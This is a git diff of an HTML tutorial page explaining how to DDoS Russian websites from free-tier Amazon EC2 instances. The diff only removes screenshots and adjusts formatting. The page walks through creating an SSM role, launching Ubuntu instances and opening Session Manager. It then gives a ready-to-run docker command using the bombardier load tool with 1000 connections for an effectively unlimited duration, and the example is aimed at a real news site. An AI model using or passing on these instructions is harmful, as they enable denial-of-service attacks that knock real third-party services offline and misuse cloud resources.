@@ -78,16 +78,13 @@
         <li>4. After selecting a region, go to the <a href="https://console.aws.amazon.com/iamv2/home#/roles">IAM service</a> to create a service role for the instance.</li>
         <ul>
             <li>In IAM click <b>Create Role</b> - <b>EC2</b> - <b>Next</b> -</li>
-            <img src="https://telegra.ph/file/9104e194cce5fb229c982.png" width="600" height="200">
             <li>In <b>Add permissions</b> - in the search line - look for <a href="https://console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM">AmazonEC2RoleforSSM</a> and select it.</li>
-            <img src="https://s.dou.ua/storage-files/remotely-run-commands-ec2-instance-systems-manager-1d.fc64c36ffa3e036f527f_aCb7isE.png" width="600" height="400">
             <li>Then we name the role as created (as you like), e.g. <b>SSMInstanceRole</b>, and complete the creation of the role by clicking the <b>Create Role</b> button from below.</li>
           </ul>
         <li>After creating the role, move to the creation of the instance for the <a href="https://console.aws.amazon.com/ec2/v2/home">link</a> and select <b>Launch Instance.</b></li>
         <ul>
             <li>In the search box, look for <b>ubuntu</b> and choose the top <b>Ubuntu Server 20.04 LTS</b> on the list by clicking <b>Select</b></li>
             <li>In the Choose an Instance Type tab, select <b>t2.micro</b> and click <b>Next.Configure Instance Details</b>.</li>
-            <img src="https://telegra.ph/file/6b8b5a581986fad4dc755.png" width="600" height="400">
             <li><b>The Number of instances</b> can be used to select the number of instances you want to create. 1, 2, 3, etc. 
                 (don't forget about the number of free one month usage in 750 years). All other parameters are defaulted, 
                 but look for <b>IAM Role</b> and select the previously created role and the next important parameter <b>User Data</b>:</li>
@@ -111,26 +108,24 @@
                     </code>
                   </pre>
             <li>Next click Review and Launch --- Launch --- Procceed without a key pair --- I acknowledge that without a key pair... --- Launch Instance</li>
-            <img src="https://telegra.ph/file/6ae557ba62bb80d53605c.png" width="600" height="400">
             <li>Go to the board via <b>View Instance</b>. It is necessary to wait for 2 or 3 seconds, until the instance will be configured.</li>
           </ul>
           <li> Once the instance is in Running status, select it by clicking on its ID - click <b>Connect</b> - select <b>Session Manager --- Connect</b></li>
-          <img src="https://telegra.ph/file/db8a6b2949825456ad3a4.png" width="600" height="400">
           <li>After entering the thermal, enter <b>sudo -s</b>. For example, you can use the <a href="https://github.com/almerico/bombardier">tool</a>. 
               For this you need to run the command docker run -d -rm alpine/bombardier -c 1000 -d 600000h {URL target} in the thermal.</li> <br>
               
       </ol>
       Example: <br>
-      <pre>
-        <code>
+<pre>
+<code>
 docker run -d --rm alpine/bombardier -c 1000 -
 d 600000h https://lenta.ru
-                </code>
-            </pre>
+</code>
+</pre>
       After the target stops responding through the anonimous browser, you can terminate the instance or go to the next target. 
       Check if the container is running: docker ps -a command. Stop docker container: docker stop {id container}.
 
-        Source: <a href="https://telegra.ph/YAk-DDoS-ti-z-Free-Tier-z-Amazon-Cloud-03-05?from=tg&utm_source=telegram&utm_medium=social">link</a>.  
+      Source: <a href="https://telegra.ph/YAk-DDoS-ti-z-Free-Tier-z-Amazon-Cloud-03-05?from=tg&utm_source=telegram&utm_medium=social">link</a>.  
       </section>
 
       <section id="home">
@@ -163,7 +158,7 @@ d 600000h https://lenta.ru
           In this tutorial will try to describe how to DDoS russian resources using Amazon servers.
     Amazon gives 750 hours of EC2 (virtual server) as a Free Tier for a month.
     Therefore, a simple calculation: 1 server - 1 month of free t2.micro free service, 2 servers - 15 days, etc.
-    After using these limits will be drawn in accordance with Amazon <a href="https://aws.amazon.com/ru/ec2/pricing/on-demand/">pricing</a>, 
+    After using these limits will be drawn in accordance with Amazon pricing 
     so after the execution of the work do not forget to disable the instances. <a href="#How-to-DDos">Read more</a> </p>
       </section>
       
